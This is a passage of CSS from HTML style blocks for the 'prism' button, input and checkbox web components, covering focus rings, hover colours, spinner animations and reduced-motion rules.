            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-positive-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.caution.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-base) / var(--tw-text-opacity))
        }

        .link.caution.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-hover) / var(--tw-text-opacity))
        }

        .link.caution.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-down) / var(--tw-text-opacity))
        }

        .link.caution.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-caution-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.negative.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-base) / var(--tw-text-opacity))
        }

        .link.negative.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-hover) / var(--tw-text-opacity))
        }

        .link.negative.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-down) / var(--tw-text-opacity))
        }

        .link.negative.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .disabled.sc-prism-button-default {
            cursor: not-allowed;
            opacity: 0.3
        }

        .icon.sc-prism-button-default {
            position: relative;
            margin-right: 0.25rem;
            height: 1rem;
            width: 1rem;
            color: inherit
        }

        @-webkit-keyframes spin {
            to {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        @keyframes spin {
            to {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        .circular.sc-prism-button-default {
            -webkit-animation: spin 1s linear infinite;
            animation: spin 1s linear infinite;
            height: 100%;
            -webkit-transform-origin: center center;
            transform-origin: center center;
            width: 100%;
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto
        }

        @-webkit-keyframes dash {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35px
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124px
            }
        }

        @keyframes dash {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35px
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124px
            }
        }

        .path.sc-prism-button-default {
            -webkit-animation: dash 1.5s ease-in-out infinite;
            animation: dash 1.5s ease-in-out infinite;
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
            stroke-linecap: round
        }

        @keyframes dash {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35px
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124px
            }
        }

        @media (prefers-reduced-motion: reduce) {
            .btn.sc-prism-button-default {
                transition: none
            }

            .btn.sc-prism-button-default::after {
                transition: none
            }

            .btn.sc-prism-button-default:hover {
                transition: none
            }

            .path.sc-prism-button-default {
                -webkit-animation: none;
                animation: none
            }

            .circular.sc-prism-button-default {
                -webkit-animation: none;
                animation: none
            }
        }
    </style>
    <style>
        .sc-prism-input-default-h {
            --icon-offset-x: 0.75rem;
            --icon-offset-y: 0%;
            --input-margin-top: 1rem;
            --input-margin-bottom: 1rem;
            --text-align: left;
            position: relative;
            box-sizing: border-box;
            display: block;
            width: 100%;
            margin-top: var(--input-margin-top);
            margin-bottom: var(--input-margin-bottom)
        }

        .screen-reader-text.sc-prism-input-default {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0
        }

        .label-text.sc-prism-input-default {
            margin-bottom: 0.25rem;
            display: inline-block;
            cursor: pointer;
            text-align: left;
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity))
        }

        .hint-container.sc-prism-input-default {
            margin-top: 0.25rem;
            display: flex;
            align-items: center
        }

        .hint-container.sc-prism-input-default>.sc-prism-input-default:not([hidden])~.sc-prism-input-default:not([hidden]) {
            --tw-space-x-reverse: 0;
            margin-right: calc(0.25rem * var(--tw-space-x-reverse));
            margin-left: calc(0.25rem * calc(1 - var(--tw-space-x-reverse)))
        }

        .hint-text.sc-prism-input-default {
            display: block;
            text-align: left
        }

        @media (prefers-reduced-motion) {
            .input.sc-prism-input-default {
                transition: none
            }
        }

        .input.sc-prism-input-default {
            font-family: DMSans, Helvetica, sans-serif;
            font-size: 1.00000rem;
            font-weight: 400;
            letter-spacing: 0px;
            line-height: 1.50000;
            text-transform: none;
            box-sizing: border-box;
            width: 100%;
            background-color: transparent;
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity));
            outline: 2px solid transparent;
            outline-offset: 2px;
            border-bottom-width: 1px;
            border-top-width: 0px;
            border-left-width: 0px;
            border-right-width: 0px;
            border-style: solid;
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-neutral2-base) / var(--tw-border-opacity));
            text-align: left;
            text-align: var(--text-align, left);
            transition: border-color, box-shadow, border-radius, padding 0.2s ease
        }

        .input.minimal.sc-prism-input-default {
            padding-left: 0px;
            padding-right: 0px;
            padding-top: 0.75rem;
            padding-bottom: 0.5rem
        }

        .input.contained.sc-prism-input-default {
            border-radius: 4px;
            border-width: 1px;
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-material-2) / var(--tw-bg-opacity));
            --shadow-color: rgba(91, 91, 93, 0.51);
            padding: 1rem
        }

        .input.sc-prism-input-default::-webkit-input-placeholder {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral2-base) / var(--tw-text-opacity))
        }

        .input.sc-prism-input-default::-moz-placeholder {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral2-base) / var(--tw-text-opacity))
        }

        .input.sc-prism-input-default::placeholder {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral2-base) / var(--tw-text-opacity))
        }

        .input.contained.sc-prism-input-default:focus {
            border-color: transparent;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity))
        }

        .input.minimal.sc-prism-input-default:focus {
            border-bottom-width: 2px;
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-theme1-base) / var(--tw-border-opacity))
        }

        .input.minimal.valid.sc-prism-input-default,
        .input.contained.valid.sc-prism-input-default,
        .input.minimal.valid.sc-prism-input-default:focus {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-positive-base) / var(--tw-border-opacity))
        }

        .input.contained.valid.sc-prism-input-default:focus {
            border-color: transparent;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-positive-base) / var(--tw-ring-opacity))
        }

        .input.minimal.invalid.sc-prism-input-default,
        .input.contained.invalid.sc-prism-input-default,
        .input.minimal.invalid.sc-prism-input-default:focus {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-base) / var(--tw-border-opacity))
        }

        .input.contained.invalid.sc-prism-input-default:focus {
            border-color: transparent;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity))
        }

        .input.icon-leading.sc-prism-input-default {
            padding-left: 3rem
        }

        .input.minimal.icon-leading.sc-prism-input-default {
            padding-left: 2rem
        }

        .input.icon-trailing.sc-prism-input-default {
            padding-right: 3.5rem
        }

        .input.disabled.sc-prism-input-default::-webkit-input-placeholder {
            cursor: not-allowed;
            --tw-border-opacity: 0.3;
            --tw-text-opacity: 0.3
        }

        .input.disabled.sc-prism-input-default::-moz-placeholder {
            cursor: not-allowed;
            --tw-border-opacity: 0.3;
            --tw-text-opacity: 0.3
        }

        .input.disabled.sc-prism-input-default::placeholder,
        .input.disabled.sc-prism-input-default,
        .input.minimal.disabled.sc-prism-input-default,
        .input.contained.disabled.sc-prism-input-default {
            cursor: not-allowed;
            --tw-border-opacity: 0.3;
            --tw-text-opacity: 0.3
        }

        .invalid-text.sc-prism-input-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-base) / var(--tw-text-opacity))
        }

        .valid-text.sc-prism-input-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-base) / var(--tw-text-opacity))
        }

        .wrap.sc-prism-input-default {
            position: relative;
            display: block
        }

        .icon-search.sc-prism-input-default,
        .sc-prism-input-default-s>[slot^='icon-'] {
            position: absolute;
            z-index: 10;
            --icon-color: inherit;
            top: calc(50% - var(--icon-offset-y));
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        .icon-search.sc-prism-input-default {
            pointer-events: none
        }

        .contained.sc-prism-input-default-h .icon-search.sc-prism-input-default,
        .sc-prism-input-default-h.contained .sc-prism-input-default-s>[slot='icon-leading'] {
            left: 1rem
        }

        .minimal.sc-prism-input-default-h .icon-search.sc-prism-input-default,
        .sc-prism-input-default-h.minimal .sc-prism-input-default-s>[slot='icon-leading'] {
            left: 0px
        }

        .sc-prism-input-default-h.contained .sc-prism-input-default-s>[slot='icon-trailing'] {
            right: 1rem
        }

        .sc-prism-input-default-h.minimal .sc-prism-input-default-s>[slot='icon-trailing'] {
            right: 0px
        }

        .sc-prism-input-default-s>button[slot^='icon-'] {
            cursor: pointer;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            border-style: none;
            background: transparent
        }

        .sc-prism-input-default-s>button[slot^='icon-']:focus {
            outline-color: #35353B;
            outline-color: var(--outline-color-neutral, #35353B)
        }

        .file-button.invalid.sc-prism-input-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-base) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(66, 0, 19, 0.51)
        }

        .file-button.invalid.sc-prism-input-default:hover {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-hover) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .file-label.sc-prism-input-default {
            display: flex
        }

        .file-label-disabled.sc-prism-input-default {
            opacity: 0.3
        }

        .file-label-disabled.sc-prism-input-default .file-button.sc-prism-input-default:hover {
            cursor: not-allowed;
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(6, 6, 7, 0.51)
        }

        .focus.sc-prism-input-default {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity))
        }

        .focus.invalid.sc-prism-input-default {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity))
        }

        .focus.valid.sc-prism-input-default {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-positive-base) / var(--tw-ring-opacity))
        }

        .file-grid.sc-prism-input-default {
            display: grid;
            grid-template-columns: 1fr -webkit-max-content -webkit-max-content;
            grid-template-columns: 1fr max-content max-content
        }

        .clear.sc-prism-input-default {
            padding: 0.25rem
        }

        .clear.sc-prism-input-default:focus {
            outline-color: #35353B;
            outline-color: var(--outline-color-neutral, #35353B)
        }

        .file.sc-prism-input-default {
            border-color: transparent;
            background-color: transparent;
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0
        }

        .placeholder.sc-prism-input-default {
            font-family: DMSans, Helvetica, sans-serif;
            font-size: 0.87500rem;
            font-weight: 400;
            letter-spacing: 0px;
            line-height: 1.50000;
            text-transform: none;
            display: flex;
            flex: 1 1 auto;
            flex-wrap: wrap;
            align-items: center;
            border-style: solid;
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity));
            border-width: 1px;
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-neutral-base) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-material-2) / var(--tw-bg-opacity));
            padding: 1rem;
            --shadow-color: rgba(91, 91, 93, 0.51)
        }

        .placeholder.invalid.sc-prism-input-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-base) / var(--tw-border-opacity))
        }

        .placeholder.valid.sc-prism-input-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-positive-base) / var(--tw-border-opacity))
        }

        .count.sc-prism-input-default,
        .placeholder-text.sc-prism-input-default,
        .filename.sc-prism-input-default {
            margin-left: 0.25rem;
            margin-right: 0.25rem
        }

        .file-button.sc-prism-input-default {
            margin-bottom: 0px;
            flex-shrink: 0;
            flex-grow: 0;
            align-self: flex-start;
            border-width: 1px;
            border-style: solid;
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-neutral-base) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-base) / var(--tw-bg-opacity));
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --shadow-color: rgba(6, 6, 7, 0.51);
            padding-top: 1rem;
            padding-bottom: 1rem;
            padding-left: 0.5rem;
            padding-right: 0.5rem;
            transition: border-color, color, background-color 250ms ease-in-out
        }

        .focus.sc-prism-input-default .file-button.sc-prism-input-default {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(18, 0, 51, 0.51);
            transition: border-color, opacity, background-color 250ms ease-in-out
        }

        .focus.sc-prism-input-default .placeholder.sc-prism-input-default {
            border-color: transparent
        }

        .focus.sc-prism-input-default .file-button.valid.sc-prism-input-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-positive-focus) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-focus) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 27, 20, 0.51)
        }

        .focus.sc-prism-input-default .file-button.invalid.sc-prism-input-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-focus) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-focus) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .file-button.sc-prism-input-default:hover {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-neutral-hover) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(17, 17, 19, 0.51);
            transition: opacity 250ms ease-in-out, border-color 250ms ease-in-out
        }

        .invalid.month.contained.sc-prism-input-default,
        .valid.month.contained.sc-prism-input-default,
        .invalid.datetime-local.contained.sc-prism-input-default,
        .valid.datetime-local.contained.sc-prism-input-default,
        .invalid.date.contained.sc-prism-input-default,
        .valid.date.contained.sc-prism-input-default {
            padding-right: 3.5rem
        }

        .invalid.month.sc-prism-input-default,
        .valid.month.sc-prism-input-default,
        .invalid.datetime-local.sc-prism-input-default,
        .valid.datetime-local.sc-prism-input-default,
        .invalid.date.sc-prism-input-default,
        .valid.date.sc-prism-input-default {
            padding-right: 1.5rem
        }

        .number.sc-prism-input-default::-webkit-outer-spin-button,
        .number.sc-prism-input-default::-webkit-inner-spin-button {
            -webkit-appearance: none;
            appearance: none;
            -moz-appearance: textfield
        }

        .invalid.search.contained.sc-prism-input-default,
        .valid.search.contained.sc-prism-input-default {
            padding-right: 3.5rem
        }

        .invalid.search.sc-prism-input-default,
        .valid.search.sc-prism-input-default {
            padding-right: 1.75rem
        }

        @media (prefers-reduced-motion: reduce) {
            .focus.sc-prism-input-default .file-button.sc-prism-input-default {
                transition: none
            }

            .file-button.sc-prism-input-default {
                transition: none
            }

            .file-button.sc-prism-input-default:hover {
                transition: none
            }
        }
    </style>
    <style>
        .sc-prism-checkbox-default-h {
            --checkbox-margin-top: 1rem;
            --checkbox-margin-bottom: 1rem;
            position: relative;
            display: block;
            width: auto;
            margin-top: var(--checkbox-margin-top);
            margin-bottom: var(--checkbox-margin-bottom)
        }

        .screen-reader-text.sc-prism-checkbox-default {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0
        }

        .label.sc-prism-checkbox-default {
            display: flex;
            align-items: flex-start
        }

        .label.sc-prism-checkbox-default:hover {
            cursor: pointer
        }

        .label.sc-prism-checkbox-default:hover .checkbox.checked.sc-prism-checkbox-default,
        .input.sc-prism-checkbox-default:hover+.label.sc-prism-checkbox-default .checkbox.checked.sc-prism-checkbox-default,
        .label.sc-prism-checkbox-default:hover .checkbox.indeterminate.sc-prism-checkbox-default,
        .input.sc-prism-checkbox-default:hover+.label.sc-prism-checkbox-default .checkbox.indeterminate.sc-prism-checkbox-default {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(18, 0, 51, 0.51)
        }

        .input[disabled].sc-prism-checkbox-default:hover,
        .label.disabled.sc-prism-checkbox-default:hover {
            cursor: not-allowed
        }

        .label-text.sc-prism-checkbox-default {
            display: inline-block;
            padding-left: 1rem;
            vertical-align: middle;
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity))
        }

        .label.sc-prism-checkbox-default:hover .label-text.sc-prism-checkbox-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-hover) / var(--tw-text-opacity))
        }

        .input.sc-prism-checkbox-default:hover+.label.sc-prism-checkbox-default .checkbox.sc-prism-checkbox-default:not(.checked) {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-neutral2-hover) / var(--tw-border-opacity))
        }

        .checkbox.sc-prism-checkbox-default {
            pointer-events: none;
            display: inline-block;
            height: 1.5rem;
            width: 1.5rem;
            flex-shrink: 0;
            border-radius: 4px;
            border-width: 1px;
            border-style: solid;
            border-color: rgb(var(--border-color-stroke-neutral2-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.6;
            background-color: transparent;
            text-align: center;
            vertical-align: middle;
            transition: all 200ms ease-in;
            transition-property: background-color, border-color, box-shadow
        }

        @media (prefers-reduced-motion: reduce) {
            .checkbox.sc-prism-checkbox-default {
                transition: none
            }
        }

        .input.sc-prism-checkbox-default {
            margin: 0;
            padding: 0;
            overflow: hidden;
            position: absolute;
            visibility: visible;
            opacity: 0;
            height: 1.5rem;
            width: 1.5rem;
            cursor: pointer;
            border-width: 1px;
            border-style: solid;
            top: 2px;
            left: 2px
        }

        [focus-within].sc-prism-checkbox-default-h .label.sc-prism-checkbox-default .checkbox.sc-prism-checkbox-default {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        [focus-within].sc-prism-checkbox-default-h .label.sc-prism-checkbox-default .checkbox.sc-prism-checkbox-default {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        [focus-within].sc-prism-checkbox-default-h .label.sc-prism-checkbox-default .checkbox.sc-prism-checkbox-default {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .sc-prism-checkbox-default-h:focus-within .label.sc-prism-checkbox-default .checkbox.sc-prism-checkbox-default {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
